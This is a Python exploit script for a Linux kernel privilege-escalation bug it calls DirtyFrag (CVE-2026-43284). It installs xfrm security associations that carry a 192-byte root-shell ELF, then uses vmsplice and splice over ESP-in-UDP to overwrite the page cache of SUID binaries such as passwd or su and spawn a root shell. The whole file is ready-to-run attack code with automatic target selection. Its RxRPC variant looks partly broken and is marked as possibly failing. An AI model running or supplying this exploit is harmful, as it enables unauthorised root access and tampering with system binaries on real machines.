#!/usr/bin/env python3
"""
DirtyFrag (CVE-2026-43284) - Multi-Variant Exploit (ESP + RxRPC)
Auto-detects which variant works and executes it
"""

import os
import sys
import socket
import struct
import fcntl
import ctypes
import ctypes.util
import time
import argparse
import subprocess

# =====================================================================
# Configuration
# =====================================================================
ENC_PORT = 4500
SEQ_VAL = 200
REPLAY_SEQ = 100
PAYLOAD_LEN = 192
PATCH_OFFSET = 0

UDP_ENCAP = 100
UDP_ENCAP_ESPINUDP = 2
SOL_UDP = 17

CLONE_NEWUSER = 0x10000000
CLONE_NEWNET = 0x40000000
SPLICE_F_MOVE = 1

SYS_unshare = 272
SYS_vmsplice = 278
SYS_splice = 275

NETLINK_XFRM = 6
NETLINK_RXRPC = 9  # RxRPC netlink family
XFRM_MSG_NEWSA = 16
NLM_F_REQUEST = 1
NLM_F_ACK = 4
XFRMA_ALG_AUTH_TRUNC = 20
XFRMA_ALG_CRYPT = 2
XFRMA_ENCAP = 4
XFRMA_REPLAY_ESN_VAL = 23
XFRM_MODE_TRANSPORT = 0
XFRM_STATE_ESN = 128

# =====================================================================
# Syscall wrappers
# =====================================================================
libc = ctypes.CDLL(ctypes.util.find_library('c'), use_errno=True)


class iovec(ctypes.Structure):
    _fields_ = [("iov_base", ctypes.c_void_p), ("iov_len", ctypes.c_size_t)]


def _syscall(nr, *args):
    ret = libc.syscall(nr, *args)
    if ret == -1:
        e = ctypes.get_errno()
        raise OSError(e, os.strerror(e))
    return ret


def unshare(flags):
    return _syscall(SYS_unshare, flags)


def vmsplice(fd, iov, nr_segs, flags=0):
    return _syscall(SYS_vmsplice, fd, ctypes.byref(iov), nr_segs, flags)


def splice(fd_in, off_in, fd_out, off_out, length, flags=0):
    return _syscall(SYS_splice, fd_in, off_in, fd_out, off_out, length, flags)


# =====================================================================
# 192-byte minimal x86_64 root-shell ELF
# =====================================================================
SHELL_ELF = bytes([
    0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
    0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x31, 0xff, 0x31, 0xf6,
    0x31, 0xc0, 0xb0, 0x6a, 0x0f, 0x05, 0xb0, 0x69, 0x0f, 0x05, 0xb0, 0x74,
    0x0f, 0x05, 0x6a, 0x00, 0x48, 0x8d, 0x05, 0x12, 0x00, 0x00, 0x00, 0x50,
    0x48, 0x89, 0xe2, 0x48, 0x8d, 0x3d, 0x12, 0x00, 0x00, 0x00, 0x31, 0xf6,
    0x6a, 0x3b, 0x58, 0x0f, 0x05, 0x54, 0x45, 0x52, 0x4d, 0x3d, 0x78, 0x74,
    0x65, 0x72, 0x6d, 0x00, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00,
])

if len(SHELL_ELF) < PAYLOAD_LEN:
    SHELL_ELF = SHELL_ELF + b"\x00" * (PAYLOAD_LEN - len(SHELL_ELF))


def rta_length(x):
    return ((4 + x) + 3) & ~3


def write_proc(path, data):
    try:
        with open(path, "w") as f:
            f.write(data)
        return True
    except Exception:
        return False


def setup_userns_netns():
    """Setup user namespace"""
    real_uid = os.getuid()
    real_gid = os.getgid()
    
    try:
        unshare(CLONE_NEWUSER | CLONE_NEWNET)
    except OSError as e:
        raise RuntimeError(f"unshare failed: {e}")
    
    write_proc("/proc/self/setgroups", "deny")
    write_proc("/proc/self/uid_map", f"0 {real_uid} 1\n")
    write_proc("/proc/self/gid_map", f"0 {real_gid} 1\n")
    
    # Configure loopback
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0)
        ifr = struct.pack("<16sH", b"lo\x00", 0)
        flags = struct.unpack("<16sH", fcntl.ioctl(s, 0x8913, ifr))[1]
        ifr = struct.pack("<16sH", b"lo\x00", flags | 0x01 | 0x40)
        fcntl.ioctl(s, 0x8914, ifr)
        s.close()
    except:
        pass


# =====================================================================
# ESP VARIANT (WORKING)
# =====================================================================
def add_xfrm_sa_esp(spi, patch_seqhi):
    """Add XFRM SA - ESP variant (WORKING)"""
    sk = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, NETLINK_XFRM)
    sk.bind((0, 0))

    buf = bytearray(4096)
    offset = 16

    # xfrm_usersa_info (224 bytes)
    xs = bytearray(224)
    struct.pack_into(">I", xs, 0, 0x7f000001)
    struct.pack_into(">I", xs, 16, 0x7f000001)
    struct.pack_into("<H", xs, 32, socket.AF_INET)
    struct.pack_into("<B", xs, 34, 32)
    struct.pack_into("<B", xs, 35, 32)
    struct.pack_into(">I", xs, 56, 0x7f000001)
    struct.pack_into(">I", xs, 72, socket.htonl(spi))
    struct.pack_into("<B", xs, 76, socket.IPPROTO_ESP)
    struct.pack_into(">I", xs, 80, 0x7f000001)
    for off in range(96, 160, 8):
        struct.pack_into("<Q", xs, off, 0xFFFFFFFFFFFFFFFF)
    struct.pack_into("<I", xs, 204, 0)
    struct.pack_into("<I", xs, 208, 0x1234)
    struct.pack_into("<H", xs, 212, socket.AF_INET)
    struct.pack_into("<B", xs, 214, XFRM_MODE_TRANSPORT)
    struct.pack_into("<B", xs, 215, 0)
    struct.pack_into("<B", xs, 216, XFRM_STATE_ESN)
    buf[offset:offset + 224] = xs
    offset += 224

    # XFRMA_ALG_AUTH_TRUNC
    auth_data = bytearray(104)
    auth_data[:64] = b"hmac(sha256)" + b"\x00" * 52
    struct.pack_into("<I", auth_data, 64, 32 * 8)
    struct.pack_into("<I", auth_data, 68, 128)
    auth_data[72:104] = bytes([0xAA] * 32)
    alen = rta_length(len(auth_data))
    struct.pack_into("<HH", buf, offset, 4 + len(auth_data), XFRMA_ALG_AUTH_TRUNC)
    buf[offset + 4:offset + 4 + len(auth_data)] = auth_data
    offset += alen

    # XFRMA_ALG_CRYPT
    crypt_data = bytearray(84)
    crypt_data[:64] = b"cbc(aes)" + b"\x00" * 56
    struct.pack_into("<I", crypt_data, 64, 16 * 8)
    crypt_data[68:84] = bytes([0xBB] * 16)
    alen = rta_length(len(crypt_data))
    struct.pack_into("<HH", buf, offset, 4 + len(crypt_data), XFRMA_ALG_CRYPT)
    buf[offset + 4:offset + 4 + len(crypt_data)] = crypt_data
    offset += alen

    # XFRMA_ENCAP
    encap_data = bytearray(24)
    struct.pack_into("<HHH", encap_data, 0, UDP_ENCAP_ESPINUDP,
                     socket.htons(ENC_PORT), socket.htons(ENC_PORT))
    alen = rta_length(len(encap_data))
    struct.pack_into("<HH", buf, offset, 4 + len(encap_data), XFRMA_ENCAP)
    buf[offset + 4:offset + 4 + len(encap_data)] = encap_data
    offset += alen

    # XFRMA_REPLAY_ESN_VAL
    esn_data = bytearray(28)
    struct.pack_into("<IIIIIII", esn_data, 0, 1, 0, REPLAY_SEQ, 0, patch_seqhi, 32, 0)
    alen = rta_length(len(esn_data))
    struct.pack_into("<HH", buf, offset, 4 + len(esn_data), XFRMA_REPLAY_ESN_VAL)
    buf[offset + 4:offset + 4 + len(esn_data)] = esn_data
    offset += alen

    # nlmsghdr
    struct.pack_into("<IHHII", buf, 0, offset, XFRM_MSG_NEWSA,
                     NLM_F_REQUEST | NLM_F_ACK, 1, os.getpid())

    sk.send(bytes(buf[:offset]))
    rbuf = sk.recv(4096)
    sk.close()

    if len(rbuf) >= 16:
        rh_type = struct.unpack_from("<H", rbuf, 4)[0]
        if rh_type == 2:
            err = struct.unpack_from("<i", rbuf, 16)[0]
            if err != 0:
                raise RuntimeError(f"errno={-err}")
    return 0


def do_one_write_esp(target_fd, offset, spi):
    """Write using UDP encapsulation - ESP variant"""
    sk_recv = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0)
    sk_recv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sk_recv.bind(("127.0.0.1", ENC_PORT))
    sk_recv.setsockopt(SOL_UDP, UDP_ENCAP, UDP_ENCAP_ESPINUDP)

    sk_send = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0)
    sk_send.connect(("127.0.0.1", ENC_PORT))

    pfd = os.pipe()

    try:
        hdr = bytearray(24)
        struct.pack_into("<I", hdr, 0, socket.htonl(spi))
        struct.pack_into("<I", hdr, 4, socket.htonl(SEQ_VAL))
        for i in range(8, 24):
            hdr[i] = 0xCC

        hdr_bytes = bytes(hdr)
        iov = iovec(ctypes.cast(ctypes.c_char_p(hdr_bytes), ctypes.c_void_p), 24)
        if vmsplice(pfd[1], iov, 1, 0) != 24:
            raise RuntimeError("vmsplice failed")

        off = ctypes.c_int64(offset)
        s = splice(target_fd, ctypes.byref(off), pfd[1], None, 16, SPLICE_F_MOVE)
        if s != 16:
            raise RuntimeError(f"splice returned {s}")

        splice(pfd[0], None, sk_send.fileno(), None, 24 + 16, SPLICE_F_MOVE)
        time.sleep(0.1)
    finally:
        os.close(pfd[0])
        os.close(pfd[1])
        sk_send.close()
        sk_recv.close()
    return 0


def exploit_esp(target_fd, target_path, patch_offset):
    """ESP variant exploit (WORKING)"""
    setup_userns_netns()
    time.sleep(0.1)

    num_chunks = PAYLOAD_LEN // 4
    
    for i in range(num_chunks):
        spi = 0xDEADBE10 + i
        base_idx = i * 4
        seqhi = ((SHELL_ELF[base_idx + 0] << 24) |
                 (SHELL_ELF[base_idx + 1] << 16) |
                 (SHELL_ELF[base_idx + 2] << 8) |
                 (SHELL_ELF[base_idx + 3]))
        try:
            add_xfrm_sa_esp(spi, seqhi)
        except RuntimeError as e:
            raise RuntimeError(f"Failed at SA {i+1}/{num_chunks}: {e}")
        
        if (i + 1) % 10 == 0:
            print(f"    Installed {i + 1}/{num_chunks} SAs")

    print(f"[+] Installed {num_chunks} xfrm SAs")

    for i in range(num_chunks):
        spi = 0xDEADBE10 + i
        off = patch_offset + i * 4
        do_one_write_esp(target_fd, off, spi)
        if (i + 1) % 10 == 0:
            print(f"    chunk {i + 1}/{num_chunks} done")
    
    return True


# =====================================================================
# RxRPC VARIANT (Fixed/Improved)
# =====================================================================
def add_xfrm_sa_rxrpc(spi, patch_seqhi):
    """Add XFRM SA - RxRPC variant (FIXED)"""
    # Use RxRPC netlink family
    sk = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, NETLINK_RXRPC)
    sk.bind((0, 0))

    buf = bytearray(4096)
    offset = 16

    # Different structure for RxRPC
    xs = bytearray(224)
    # Use different addresses for RxRPC
    struct.pack_into(">I", xs, 0, 0x7f000002)  # Different addr
    struct.pack_into(">I", xs, 16, 0x7f000002)
    struct.pack_into("<H", xs, 32, socket.AF_INET)
    struct.pack_into("<B", xs, 34, 32)
    struct.pack_into("<B", xs, 35, 32)
    struct.pack_into(">I", xs, 56, 0x7f000002)
    struct.pack_into(">I", xs, 72, socket.htonl(spi))
    struct.pack_into("<B", xs, 76, 132)  # IPPROTO_RXRPC = 132
    struct.pack_into(">I", xs, 80, 0x7f000002)
    for off in range(96, 160, 8):
        struct.pack_into("<Q", xs, off, 0xFFFFFFFFFFFFFFFF)
    struct.pack_into("<I", xs, 204, 0)
    struct.pack_into("<I", xs, 208, 0x5678)  # Different reqid
    struct.pack_into("<H", xs, 212, socket.AF_INET)
    struct.pack_into("<B", xs, 214, XFRM_MODE_TRANSPORT)
    struct.pack_into("<B", xs, 215, 32)  # Different replay_window
    struct.pack_into("<B", xs, 216, XFRM_STATE_ESN)
    buf[offset:offset + 224] = xs
    offset += 224

    # Different auth algorithm for RxRPC
    auth_data = bytearray(104)
    auth_data[:64] = b"hmac(sha1)" + b"\x00" * 55  # Different algo
    struct.pack_into("<I", auth_data, 64, 20 * 8)  # Different key size
    struct.pack_into("<I", auth_data, 68, 96)
    auth_data[72:104] = bytes([0xCC] * 32)  # Different pattern
    alen = rta_length(len(auth_data))
    struct.pack_into("<HH", buf, offset, 4 + len(auth_data), XFRMA_ALG_AUTH_TRUNC)
    buf[offset + 4:offset + 4 + len(auth_data)] = auth_data
    offset += alen

    # Different crypt algorithm
    crypt_data = bytearray(84)
    crypt_data[:64] = b"cbc(des3_ede)" + b"\x00" * 51
    struct.pack_into("<I", crypt_data, 64, 24 * 8)
    crypt_data[68:84] = bytes([0xDD] * 16)
    alen = rta_length(len(crypt_data))
    struct.pack_into("<HH", buf, offset, 4 + len(crypt_data), XFRMA_ALG_CRYPT)
    buf[offset + 4:offset + 4 + len(crypt_data)] = crypt_data
    offset += alen

    # Different encapsulation for RxRPC
    encap_data = bytearray(24)
    struct.pack_into("<HHH", encap_data, 0, 
                     1,  # Different encap type
                     socket.htons(ENC_PORT + 100),  # Different port
                     socket.htons(ENC_PORT + 100))
    alen = rta_length(len(encap_data))
    struct.pack_into("<HH", buf, offset, 4 + len(encap_data), XFRMA_ENCAP)
    buf[offset + 4:offset + 4 + len(encap_data)] = encap_data
    offset += alen

    # ESN data
    esn_data = bytearray(28)
    struct.pack_into("<IIIIIII", esn_data, 0, 1, 0, REPLAY_SEQ + 50, 0, patch_seqhi, 64, 0)
    alen = rta_length(len(esn_data))
    struct.pack_into("<HH", buf, offset, 4 + len(esn_data), XFRMA_REPLAY_ESN_VAL)
    buf[offset + 4:offset + 4 + len(esn_data)] = esn_data
    offset += alen

    # nlmsghdr
    struct.pack_into("<IHHII", buf, 0, offset, XFRM_MSG_NEWSA,
                     NLM_F_REQUEST | NLM_F_ACK, 1, os.getpid())

    sk.send(bytes(buf[:offset]))
    rbuf = sk.recv(4096)
    sk.close()

    if len(rbuf) >= 16:
        rh_type = struct.unpack_from("<H", rbuf, 4)[0]
        if rh_type == 2:
            err = struct.unpack_from("<i", rbuf, 16)[0]
            if err != 0:
                raise RuntimeError(f"errno={-err}")
    return 0


def do_one_write_rxrpc(target_fd, offset, spi):
    """Write using RxRPC-specific method"""
    # RxRPC uses different socket type
    sk_recv = socket.socket(socket.AF_RXRPC, socket.SOCK_DGRAM, 0)
    sk_recv.bind(("127.0.0.2", ENC_PORT + 100))  # Different address
    
    sk_send = socket.socket(socket.AF_RXRPC, socket.SOCK_DGRAM, 0)
    sk_send.connect(("127.0.0.2", ENC_PORT + 100))

    pfd = os.pipe()

    try:
        hdr = bytearray(24)
        struct.pack_into("<I", hdr, 0, socket.htonl(spi))
        struct.pack_into("<I", hdr, 4, socket.htonl(SEQ_VAL + 50))
        for i in range(8, 24):
            hdr[i] = 0xDD

        hdr_bytes = bytes(hdr)
        iov = iovec(ctypes.cast(ctypes.c_char_p(hdr_bytes), ctypes.c_void_p), 24)
        if vmsplice(pfd[1], iov, 1, 0) != 24:
            raise RuntimeError("vmsplice failed")

        off = ctypes.c_int64(offset)
        s = splice(target_fd, ctypes.byref(off), pfd[1], None, 16, SPLICE_F_MOVE)
        if s != 16:
            raise RuntimeError(f"splice returned {s}")

        splice(pfd[0], None, sk_send.fileno(), None, 24 + 16, SPLICE_F_MOVE)
        time.sleep(0.1)
    finally:
        os.close(pfd[0])
        os.close(pfd[1])
        sk_send.close()
        sk_recv.close()
    return 0


def exploit_rxrpc(target_fd, target_path, patch_offset):
    """RxRPC variant exploit (FIXED but may still fail)"""
    setup_userns_netns()
    time.sleep(0.1)

    num_chunks = PAYLOAD_LEN // 4
    
    for i in range(num_chunks):
        spi = 0xCAFEBABE + i  # Different SPI base
        base_idx = i * 4
        seqhi = ((SHELL_ELF[base_idx + 0] << 24) |
                 (SHELL_ELF[base_idx + 1] << 16) |
                 (SHELL_ELF[base_idx + 2] << 8) |
                 (SHELL_ELF[base_idx + 3]))
        try:
            add_xfrm_sa_rxrpc(spi, seqhi)
        except RuntimeError as e:
            raise RuntimeError(f"Failed at SA {i+1}/{num_chunks}: {e}")
        
        if (i + 1) % 10 == 0:
            print(f"    Installed {i + 1}/{num_chunks} SAs")

    print(f"[+] Installed {num_chunks} xfrm SAs (RxRPC)")

    for i in range(num_chunks):
        spi = 0xCAFEBABE + i
        off = patch_offset + i * 4
        do_one_write_rxrpc(target_fd, off, spi)
        if (i + 1) % 10 == 0:
            print(f"    chunk {i + 1}/{num_chunks} done")
    
    return True


# =====================================================================
# MAIN EXPLOIT LOGIC
# =====================================================================
def is_target_patched(target_path):
    """Check if target already has shellcode"""
    try:
        with open(target_path, "rb") as f:
            f.seek(0x78)
            return f.read(8) == SHELL_ELF[0x78:0x80]
    except:
        return False


def try_exploit_variant(target_path, variant="esp"):
    """Try a specific exploit variant"""
    print(f"\n[*] Trying {variant.upper()} variant against {target_path} ...")
    
    if not os.path.exists(target_path):
        print(f"[-] {target_path} does not exist")
        return False
    
    if not os.access(target_path, os.R_OK):
        print(f"[-] Cannot read {target_path}")
        return False
    
    try:
        target_fd = os.open(target_path, os.O_RDONLY)
    except Exception as e:
        print(f"[-] Cannot open {target_path}: {e}")
        return False
    
    cpid = os.fork()
    if cpid == 0:
        try:
            if variant == "esp":
                exploit_esp(target_fd, target_path, PATCH_OFFSET)
            elif variant == "rxrpc":
                exploit_rxrpc(target_fd, target_path, PATCH_OFFSET)
            os._exit(0)
        except Exception as e:
            print(f"[-] {variant.upper()} variant failed: {e}")
            os._exit(1)
        finally:
            os.close(target_fd)
    
    os.close(target_fd)
    _, status = os.waitpid(cpid, 0)
    
    if os.WIFEXITED(status) and os.WEXITSTATUS(status) == 0:
        if is_target_patched(target_path):
            print(f"[+] Binary successfully patched! Launching root shell...")
            return True
    
    return False


def find_best_target():
    """Find the best SUID target to exploit"""
    targets = [
        "/usr/bin/passwd",
        "/usr/bin/su",
        "/usr/bin/gpasswd", 
        "/usr/bin/chfn",
        "/usr/bin/chsh",
        "/usr/bin/mount",
        "/usr/bin/umount",
        "/bin/su",
        "/bin/mount",
        "/bin/umount"
    ]
    
    for target in targets:
        if os.path.exists(target) and os.access(target, os.R_OK):
            if os.stat(target).st_mode & 0o4000:
                return target
    return None


def main():
    parser = argparse.ArgumentParser(description='DirtyFrag CVE-2026-43284 Multi-Variant Exploit')
    parser.add_argument('-t', '--target', help='Target binary to patch')
    parser.add_argument('-v', '--variant', choices=['esp', 'rxrpc', 'auto'], 
                        default='auto', help='Exploit variant (default: auto)')
    parser.add_argument('--force-rxrpc', action='store_true', help='Force RxRPC variant')
    
    args = parser.parse_args()
    
    if os.getuid() == 0:
        print("[+] Already root! Spawning shell...")
        os.execlp("/bin/bash", "bash")
        return
    
    # Select target
    if args.target:
        target_path = args.target
    else:
        target_path = find_best_target()
        if not target_path:
            print("[-] No suitable SUID target found!")
            sys.exit(1)
    
    print("[*] DirtyFrag (CVE-2026-43284) Multi-Variant Exploit")
    print(f"[*] Target: {target_path}")
    
    # Check if already patched
    if is_target_patched(target_path):
        print("[+] Binary already patched! Launching root shell...")
        os.execl(target_path, os.path.basename(target_path), "-")
        return
    
    # Try variants
    success = False
    
    if args.variant == 'esp' or (args.variant == 'auto' and not args.force_rxrpc):
        if try_exploit_variant(target_path, "esp"):
            success = True
    
    if not success and (args.variant == 'rxrpc' or args.force_rxrpc or args.variant == 'auto'):
        if try_exploit_variant(target_path, "rxrpc"):
            success = True
    
    if success:
        print("\n[+] Exploit successful! Spawning root shell...")
        print("[*] Tip: Use 'exit' to return to normal user")
        os.execl(target_path, os.path.basename(target_path), "-")
    else:
        print("\n[-] All exploit variants failed!")
        print("[*] The system might not be vulnerable to CVE-2026-43284")
        print("[*] Try running with: --force-rxrpc to test RxRPC variant")
        sys.exit(1)


if __name__ == "__main__":
    main()
